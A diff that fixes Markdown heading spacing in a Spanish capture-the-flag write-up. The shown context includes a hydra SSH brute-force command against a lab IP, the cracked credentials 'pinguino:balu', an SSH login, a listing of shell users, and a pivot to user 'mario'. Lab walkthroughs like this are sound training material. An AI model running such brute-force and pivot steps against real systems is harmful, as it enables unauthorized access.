@@ -208,7 +208,8 @@ hydra -L user.txt  -p balu -t 16 -V -f -I ssh://172.17.0.2
 [STATUS] attack finished for 172.17.0.2 (valid pair found)
 ```
 pues ya tenemos user y pass para ssh pinguino:balu
-##fase escalada
+
+## fase escalada
 entramos desde ssh:
 ```bash
 ssh pinguino@172.17.0.2
@@ -245,7 +246,8 @@ pinguino:x:1000:1000::/home/pinguino:/bin/bash
 mario:x:1001:1001::/home/mario:/bin/bash
 ```
 aparte de pinguino que tengan shell (de ahi el  | grep sh$ de arriba) solo está mario y root
-##pivotamos a usuario mario
+
+## pivotamos a usuario mario
 ```bash
 su mario
 ```
